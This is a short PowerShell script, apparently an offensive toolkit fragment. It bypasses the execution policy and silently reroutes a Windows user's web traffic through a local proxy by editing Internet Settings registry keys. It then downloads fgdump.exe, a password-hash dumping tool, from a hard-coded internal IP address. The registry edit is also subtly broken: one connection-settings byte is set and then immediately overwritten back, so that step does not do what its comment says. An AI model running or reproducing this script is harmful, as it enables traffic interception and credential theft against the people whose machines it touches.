#powershell -ExecutionPolicy ByPass -File script.ps1

Function ChangeProxy {
    #Change this to whatever proxy you want to use
    $newProxy = "http://localhost:8080"

    $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"

    Set-ItemProperty -Path $path -Name "MigrateProxy" -Value 00000001
    Set-ItemProperty -Path $path -Name "ProxyEnable" -Value 00000001
    Set-ItemProperty -Path $path -Name "ProxyHttp1.1" -Value 00000000
    Set-ItemProperty -Path $path -Name "ProxyServer" -Value $newProxy
    Set-ItemProperty -Path $path -Name "ProxyOverride" -Value "<local>"

    #Hex array with several configurations, but just want to change the 9th value
    $a = (Get-ItemProperty -Path ($path+"Connections\") -Name DefaultConnectionSettings).DefaultConnectionSettings
    $a[8] = 3
    $a[8] = 29 #to revert

    Set-ItemProperty -Path ($path+"Connections\") -Name DefaultConnectionSettings -Value $a
}
 
Function DownloadFile {
    $url = "http://10.120.115.207"
    $client = new-object System.Net.WebClient
    $client.DownloadFile(($url+"/fgdump.exe"), "fgdump.exe")
}
       